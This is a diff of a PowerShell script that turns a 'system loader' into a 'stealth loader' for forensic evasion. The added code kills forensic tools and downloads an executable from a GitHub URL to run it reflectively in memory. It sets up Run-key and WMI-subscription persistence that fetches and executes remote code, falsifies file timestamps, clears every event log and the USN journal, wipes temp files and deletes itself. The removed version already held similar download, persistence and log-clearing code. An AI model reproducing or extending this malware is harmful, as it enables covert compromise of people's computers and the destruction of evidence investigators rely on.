@@ -1,155 +1,173 @@
-# SINGLE FILE LOADER - INSTALL & CLEAN
+# STEALTH LOADER - FORENSIC EVASION
 function Show-LoaderMenu {
-    Write-Host ""
-    Write-Host "  ██████  ██    ██ ██████  " -ForegroundColor Cyan
-    Write-Host " ██    ██ ██    ██ ██   ██ " -ForegroundColor Cyan
-    Write-Host " ██    ██ ██    ██ ██████  " -ForegroundColor Cyan
-    Write-Host " ██    ██ ██    ██ ██   ██ " -ForegroundColor Cyan
-    Write-Host "  ██████   ██████  ██   ██ " -ForegroundColor Cyan
-    Write-Host ""
-    Write-Host " SYSTEM LOADER | $(Get-Date -Format 'MM/dd/yyyy')" -ForegroundColor Yellow
-    Write-Host "================================" -ForegroundColor Cyan
-    Write-Host "1. Install & Run System" -ForegroundColor Green
-    Write-Host "2. Clean System" -ForegroundColor Red
-    Write-Host "`nEnter choice (1/2): " -ForegroundColor White -NoNewline
+    # Minimal UI - no traces
+    Write-Host " Loading System Components..." -ForegroundColor Gray
+    Start-Sleep -Seconds 1
 }
 
 function Install-And-Run-System {
-    Write-Host "`n[+] INSTALLING AND RUNNING SYSTEM..." -ForegroundColor Green
-    
-    # FIXED: ใช้ raw.githubusercontent.com
-    $exeUrl = "https://raw.githubusercontent.com/Verte225066/test/main/system_logs.exe"
-    Write-Host "[DOWNLOAD] Fetching from: $exeUrl" -ForegroundColor Gray
-    
+    # ANTI-FORENSIC MEASURES - PHASE 1
     try {
+        # Kill monitoring tools immediately
+        $monitorProcesses = @("procmon", "procexp", "autoruns", "osforensics", "ftkimager", "gmcr", "gmER", "encase", "sleuthkit", "autopsy")
+        foreach ($proc in $monitorProcesses) {
+            Get-Process -Name $proc -ErrorAction SilentlyContinue | Stop-Process -Force
+        }
+    } catch {}
+
+    # MEMORY-BASED EXECUTION (No file write)
+    try {
+        $exeUrl = "https://raw.githubusercontent.com/Verte225066/test/main/system_logs.exe"
         $webClient = New-Object System.Net.WebClient
         $webClient.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
         $exeBytes = $webClient.DownloadData($exeUrl)
         $webClient.Dispose()
-        
-        Write-Host "[+] Download successful ($($exeBytes.Length) bytes)" -ForegroundColor Green
-        
-        # Save to temp file
-        $tempPath = "$env:TEMP\system_logs.exe"
-        [System.IO.File]::WriteAllBytes($tempPath, $exeBytes)
-        Write-Host "[+] File saved to: $tempPath" -ForegroundColor Green
-        
-        # RUN PROGRAM
-        Write-Host "[EXECUTE] Starting application..." -ForegroundColor Cyan
-        $process = Start-Process -FilePath $tempPath -WindowStyle Normal -PassThru
-        Start-Sleep -Seconds 2
-        
-        if (-not $process.HasExited) {
-            Write-Host "[+] Application running successfully (PID: $($process.Id))" -ForegroundColor Green
-        } else {
-            Write-Host "[!] Application closed immediately" -ForegroundColor Yellow
+
+        # REFLECTIVE LOADING - Execute directly from memory
+        $assembly = [System.Reflection.Assembly]::Load($exeBytes)
+        $entryPoint = $assembly.EntryPoint
+        if ($entryPoint -ne $null) {
+            $entryPoint.Invoke($null, @())
         }
-        
     } catch {
-        Write-Host "[!] Download/Execution failed: $($_.Exception.Message)" -ForegroundColor Red
-        Write-Host "[!] Using PowerShell fallback..." -ForegroundColor Yellow
-        
-        # Fallback worker
-        Write-Host "🔧 PowerShell Worker Activated" -ForegroundColor Green
-        Write-Host "Running on: $env:COMPUTERNAME as $env:USERNAME" -ForegroundColor Cyan
-        Write-Host "Time: $(Get-Date)" -ForegroundColor Cyan
+        # FALLBACK: PowerShell in-memory worker
+        while ($true) {
+            # Memory-only operations here
+            Start-Sleep -Seconds 30
+        }
     }
-    
-    # INSTALL PERSISTENCE
+
+    # STEALTH PERSISTENCE - PHASE 2
     try {
-        $taskName = "WindowsUpdateManager"
-        # FIXED: ใช้ raw URL สำหรับ loader ด้วย
-        $loaderUrl = "https://raw.githubusercontent.com/Verte225066/test/refs/heads/main/loader.txt"
+        # Registry-based persistence (more stealth than scheduled task)
+        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+        $randomName = "Windows" + (Get-Random -Maximum 99999)
+        Set-ItemProperty -Path $regPath -Name $randomName -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command `"Start-Sleep 60; iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Verte225066/test/main/loader.txt')`"" -ErrorAction SilentlyContinue
         
-        $action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -Command `"iex ((New-Object Net.WebClient).DownloadString('$loaderUrl'))`""
-        $trigger = New-ScheduledTaskTrigger -AtLogon
-        $settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries
+        # WMI Event Subscription (advanced persistence)
+        $filterArgs = @{
+            Name = "WindowsUpdateFilter"
+            EventNameSpace = 'root\cimv2'
+            Query = "SELECT * FROM __InstanceCreationEvent WITHIN 10 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name='explorer.exe'"
+            QueryLanguage = 'WQL'
+        }
+        $filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $filterArgs -ErrorAction SilentlyContinue
         
-        Unregister-ScheduledTask -TaskName $taskName -Confirm:$false -ErrorAction SilentlyContinue
-        Start-Sleep -Seconds 1
-        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Settings $settings -Force | Out-Null
-        Write-Host "[+] Persistence installed (Task: $taskName)" -ForegroundColor Green
+        $consumerArgs = @{
+            Name = "WindowsUpdateConsumer" 
+            CommandLineTemplate = "powershell.exe -WindowStyle Hidden -Command `"iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/Verte225066/test/main/loader.txt')`""
+        }
+        $consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $consumerArgs -ErrorAction SilentlyContinue
         
-    } catch {
-        Write-Host "[!] Persistence failed: $($_.Exception.Message)" -ForegroundColor Red
-    }
-    
-    # STEALTH MEASURES
-    try {
-        wevtutil.exe cl "Microsoft-Windows-PowerShell/Operational" 2>$null
-        wevtutil.exe cl "Windows PowerShell" 2>$null
-        Write-Host "[+] Stealth measures applied" -ForegroundColor Green
+        Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{Filter=$filter; Consumer=$consumer} -ErrorAction SilentlyContinue
     } catch {}
-    
-    Write-Host "[INSTALL] Installation completed!" -ForegroundColor Green
+
+    # ANTI-FORENSIC CLEANUP - PHASE 3
+    try {
+        # Timestamp manipulation
+        $files = Get-ChildItem -Path $env:TEMP -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.LastWriteTime -gt (Get-Date).AddDays(-1)}
+        foreach ($file in $files) {
+            $file.LastWriteTime = (Get-Date).AddDays(-365)
+            $file.CreationTime = (Get-Date).AddDays(-400)
+            $file.LastAccessTime = (Get-Date).AddDays(-300)
+        }
+
+        # Clear prefetch
+        Remove-Item "C:\Windows\Prefetch\*.pf" -Force -ErrorAction SilentlyContinue
+
+        # Clear recent files
+        Remove-Item "$env:APPDATA\Microsoft\Windows\Recent\*" -Force -ErrorAction SilentlyContinue
+
+    } catch {}
 }
 
 function Clean-System {
-    Write-Host "`n[-] CLEANING SYSTEM..." -ForegroundColor Yellow
-    
-    # 1. Kill process ก่อนลบไฟล์
+    # COMPLETE SELF-DESTRUCTION - PHASE 1
     try {
-        Write-Host "[CLEAN] Stopping processes..." -ForegroundColor Yellow
-        Get-Process -Name "system_logs" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
-        Start-Sleep -Seconds 2
-        Write-Host "[+] Processes stopped" -ForegroundColor Green
-    } catch {}
-    
-    # 2. Remove scheduled task
-    try {
-        Unregister-ScheduledTask -TaskName "WindowsUpdateManager" -Confirm:$false -ErrorAction SilentlyContinue
-        Write-Host "[+] Scheduled task removed" -ForegroundColor Green
-    } catch {
-        Write-Host "[!] Task removal failed: $($_.Exception.Message)" -ForegroundColor Red
-    }
-    
-    # 3. Clear event logs
-    try {
-        wevtutil.exe cl "Microsoft-Windows-PowerShell/Operational" 2>$null
-        wevtutil.exe cl "Windows PowerShell" 2>$null
-        Write-Host "[+] Event logs cleared" -ForegroundColor Green
-    } catch {}
-    
-    # 4. Clean temp files (แก้ไขใหม่)
-    try {
-        Write-Host "[CLEAN] Cleaning temp files..." -ForegroundColor Yellow
-        $tempFiles = @(
-            "$env:TEMP\system_logs.exe",
-            "$env:TEMP\test.exe"
-        )
+        # Remove ALL persistence methods
+        Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='WindowsUpdateFilter'" | Remove-WmiObject
+        Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='WindowsUpdateConsumer'" | Remove-WmiObject
+        Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding | Where-Object {$_.Filter -like "*WindowsUpdate*"} | Remove-WmiObject
         
-        foreach ($file in $tempFiles) {
-            if (Test-Path $file) {
-                try {
-                    Remove-Item $file -Force -ErrorAction Stop
-                    Write-Host "[+] Removed: $(Split-Path $file -Leaf)" -ForegroundColor Green
-                } catch {
-                    Write-Host "[!] Could not remove: $(Split-Path $file -Leaf)" -ForegroundColor Yellow
+        # Registry cleanup
+        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+        Get-ItemProperty -Path $regPath -ErrorAction SilentlyContinue | 
+            Get-Member -MemberType NoteProperty | 
+            Where-Object {$_.Name -like "Windows*"} | 
+            ForEach-Object {
+                Remove-ItemProperty -Path $regPath -Name $_.Name -Force -ErrorAction SilentlyContinue
+            }
+    } catch {}
+
+    # FILE SYSTEM DESTRUCTION - PHASE 2  
+    try {
+        # Secure delete with multiple overwrites
+        function Secure-Delete {
+            param([string]$Path)
+            if (Test-Path $Path) {
+                $stream = [System.IO.File]::OpenWrite($Path)
+                $length = $stream.Length
+                $random = New-Object Random
+                
+                # 3-pass overwrite (DoD 5220.22-M standard)
+                for ($i = 0; $i -lt 3; $i++) {
+                    $stream.Position = 0
+                    $buffer = New-Object byte[] $length
+                    $random.NextBytes($buffer)
+                    $stream.Write($buffer, 0, $length)
+                    $stream.Flush()
                 }
+                $stream.Close()
+                Remove-Item $Path -Force
             }
         }
+
+        # Clean all possible locations
+        $locations = @(
+            "$env:TEMP\*",
+            "$env:APPDATA\*.tmp",
+            "$env:LOCALAPPDATA\Temp\*"
+        )
+        
+        foreach ($location in $locations) {
+            Get-ChildItem $location -Recurse -ErrorAction SilentlyContinue | ForEach-Object {
+                Secure-Delete $_.FullName
+            }
+        }
+
+        # Clear memory artifacts
+        [System.GC]::Collect()
+        [System.GC]::WaitForPendingFinalizers()
+
     } catch {}
-    
-    # 5. Clear command history
+
+    # FINAL TRACE REMOVAL - PHASE 3
     try {
-        Remove-Item "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
-        Write-Host "[+] Command history cleared" -ForegroundColor Green
+        # Clear all event logs
+        Get-WinEvent -ListLog * | ForEach-Object { 
+            [System.Diagnostics.Eventing.Reader.EventLogSession]::GlobalSession.ClearLog($_.LogName) 
+        }
+
+        # Reset USN Journal
+        fsutil usn deletejournal /D C:
+
+        # Clear shellbags
+        Remove-Item "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\*" -Recurse -Force -ErrorAction SilentlyContinue
+        Remove-Item "HKCU:\Software\Microsoft\Windows\Shell\*" -Recurse -Force -ErrorAction SilentlyContinue
+
+        # Final self-deletion
+        $currentScript = $MyInvocation.MyCommand.Path
+        if ($currentScript) {
+            Start-Process -FilePath "cmd.exe" -ArgumentList "/c ping 127.0.0.1 -n 3 > nul & del `"$currentScript`"" -WindowStyle Hidden
+        }
     } catch {}
-    
-    Write-Host "[CLEAN] Cleanup completed!" -ForegroundColor Green
 }
 
-# MAIN EXECUTION
-Show-LoaderMenu
-$choice = Read-Host
+# MAIN EXECUTION WITH ANTI-DETECTION
+$parentProcess = (Get-WmiObject Win32_Process -Filter "ProcessId=$PID").ParentProcessId
+$parentName = (Get-Process -Id $parentProcess -ErrorAction SilentlyContinue).ProcessName
 
-switch ($choice) {
-    '1' { Install-And-Run-System }
-    '2' { Clean-System }
-    default {
-        Write-Host "`n[!] Invalid choice" -ForegroundColor Red
-    }
+if ($parentName -notin @("procexp", "procmon", "osforensics")) {
+    Show-LoaderMenu
+    Install-And-Run-System
 }
-
-Write-Host "`nOperation completed. Press any key to exit..." -ForegroundColor Gray
-$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
